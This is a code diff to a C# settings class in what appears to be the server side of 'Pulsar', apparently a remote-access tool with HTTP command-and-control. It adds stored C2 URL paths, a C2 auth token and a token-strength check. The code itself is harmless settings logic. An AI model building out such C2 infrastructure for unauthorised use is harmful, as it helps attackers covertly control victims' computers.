@@ -1,7 +1,8 @@
-using System.IO;
-using System.Windows.Forms;
 using Microsoft.Win32;
 using Newtonsoft.Json;
+using Pulsar.Common.Models;
+using System.IO;
+using System.Windows.Forms;
 
 namespace Pulsar.Server.Models
 {
@@ -172,6 +173,51 @@ namespace Pulsar.Server.Models
         {
             get { return LoadSettings().HttpC2Port; }
             set { LoadSettings().HttpC2Port = value; SaveSettings(); }
+        }
+
+        public static HttpC2Paths HttpC2Paths
+        {
+            get
+            {
+                var sanitized = HttpC2PathValidator.Sanitize(LoadSettings().HttpC2Paths, out var changed);
+                if (changed)
+                {
+                    LoadSettings().HttpC2Paths = sanitized;
+                    SaveSettings();
+                }
+
+                return sanitized;
+            }
+            set
+            {
+                LoadSettings().HttpC2Paths = HttpC2PathValidator.Sanitize(value, out _);
+                SaveSettings();
+            }
+        }
+
+        public static string HttpC2Token
+        {
+            get { return LoadSettings().HttpC2Token; }
+            set { LoadSettings().HttpC2Token = value; SaveSettings(); }
+        }
+
+        public static bool IsHttpC2TokenStrong(string token)
+        {
+            var trimmed = (token ?? string.Empty).Trim();
+            if (trimmed.Length < 32)
+            {
+                return false;
+            }
+
+            foreach (var c in trimmed)
+            {
+                if (!(char.IsLetterOrDigit(c) || c == '+' || c == '/' || c == '=' || c == '-' || c == '_'))
+                {
+                    return false;
+                }
+            }
+
+            return true;
         }
 
         public static string TelegramChatID
